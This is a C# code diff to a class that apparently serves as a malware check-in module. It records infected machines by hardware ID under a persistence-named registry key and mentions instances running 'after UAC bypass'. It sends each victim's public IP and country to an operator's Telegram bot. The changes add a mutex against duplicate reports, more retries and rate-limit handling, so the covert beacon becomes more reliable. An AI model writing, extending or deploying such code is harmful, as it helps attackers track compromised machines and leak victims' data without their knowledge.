@@ -21,6 +21,10 @@ internal static class TelegramNotifier
     private static readonly string _flagKey =
         $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_{GetHwidShort()}";
 
+    // Session-local mutex: serialises concurrent instances (e.g. user + admin after UAC
+    // bypass) so only one sends the notification even when both race past ShouldNotify().
+    private static readonly string _mutexName = $"Sero_tg_{GetHwidShort()}";
+
     private static bool ShouldNotify()
     {
         // Check HKLM first — machine-wide, survives SYSTEM→user context changes
@@ -164,8 +168,17 @@ internal static class TelegramNotifier
 
         Task.Run(async () =>
         {
+            // Mutex prevents duplicate notifications when two instances race on the same machine.
+            var mutex = new Mutex(false, _mutexName);
+            bool owned = false;
             try
             {
+                try   { owned = mutex.WaitOne(0); }
+                catch (AbandonedMutexException) { owned = true; }
+                if (!owned) return; // another instance is already handling this machine
+
+                if (!ShouldNotify()) return; // re-check now that we hold the mutex
+
                 await Task.Delay(500);
                 using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(12) };
                 http.DefaultRequestHeaders.UserAgent.ParseAdd(
@@ -175,11 +188,11 @@ internal static class TelegramNotifier
                 var msg = BuildMessage(pubIp, country);
 
                 bool primarySent = false;
-                for (int attempt = 0; attempt < 3 && !primarySent; attempt++)
+                for (int attempt = 0; attempt < 6 && !primarySent; attempt++)
                 {
                     try
                     {
-                        if (attempt > 0) await Task.Delay(4000);
+                        if (attempt > 0) await Task.Delay(2000);
                         await SendMessage(http, token, targets[0], msg);
                         primarySent = true;
                         MarkNotified();
@@ -192,6 +205,11 @@ internal static class TelegramNotifier
                 }
             }
             catch { }
+            finally
+            {
+                if (owned) try { mutex.ReleaseMutex(); } catch { }
+                mutex.Dispose();
+            }
         });
     }
 
@@ -218,12 +236,22 @@ internal static class TelegramNotifier
             $"Time: {dt}";
     }
 
-    // GET request with URL-encoded plain text — no parse_mode, no markdown, no 400 errors
+    // GET request with URL-encoded plain text — no parse_mode, no markdown, no 400 errors.
+    // On 429 (flood control): reads Retry-After, waits, then throws so the caller retries.
     private static async Task SendMessage(HttpClient http, string token, string chatId, string text)
     {
         var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                   $"?chat_id={Uri.EscapeDataString(chatId)}" +
                   $"&text={Uri.EscapeDataString(text)}";
-        await http.GetAsync(url);
+        var resp = await http.GetAsync(url);
+        if ((int)resp.StatusCode == 429)
+        {
+            int wait = 30; // default if Telegram omits the header
+            if (resp.Headers.TryGetValues("Retry-After", out var vals)
+                && int.TryParse(vals.FirstOrDefault(), out int ra))
+                wait = Math.Max(ra, 5);
+            await Task.Delay(wait * 1000);
+            throw new HttpRequestException($"Telegram 429 — waited {wait}s");
+        }
     }
 }
